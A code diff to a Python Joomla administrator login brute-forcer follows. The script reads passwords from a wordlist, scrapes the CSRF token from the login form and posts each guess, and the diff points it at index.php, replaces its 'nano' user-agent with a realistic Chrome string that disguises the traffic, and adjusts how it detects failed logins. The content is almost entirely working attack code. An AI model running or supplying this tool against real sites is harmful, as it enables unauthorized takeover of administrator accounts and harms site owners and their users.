@@ -52,7 +52,7 @@ class Joomla():
             self.verbose=False
 
         #http:/site/administrator
-        self.url = args.url+'/administrator/'
+        self.url = args.url+'/administrator/index.php'
         self.ret = 'aW5kZXgucGhw'
         self.option='com_login'
         self.task='login'
@@ -75,11 +75,12 @@ class Joomla():
         for password in self.getdata(self.wordlistfile):
             #Custom user-agent :)
             headers = {
-                'User-Agent': 'nano'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36'
             }
 
             #First GET for CSSRF
             r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies, headers=headers)
+            #if self.verbose: print(r.text)
             soup = BeautifulSoup(r.text, 'html.parser')
             longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
             password=password.decode('utf-8')
@@ -92,9 +93,12 @@ class Joomla():
                 'return' : self.ret,
                 longstring : 1
             }
+            if self.verbose: print(data)
             r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies, headers=headers)
+            if self.verbose: print(r.text)
             soup = BeautifulSoup(r.text, 'html.parser')
-            response = soup.find('div', {'class': 'alert-message'})
+            response = soup.find('div', {'class': 'login_message'})
+            if self.verbose: print(response.text)
             if response:
                 if self.verbose:
                     print(f'{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')
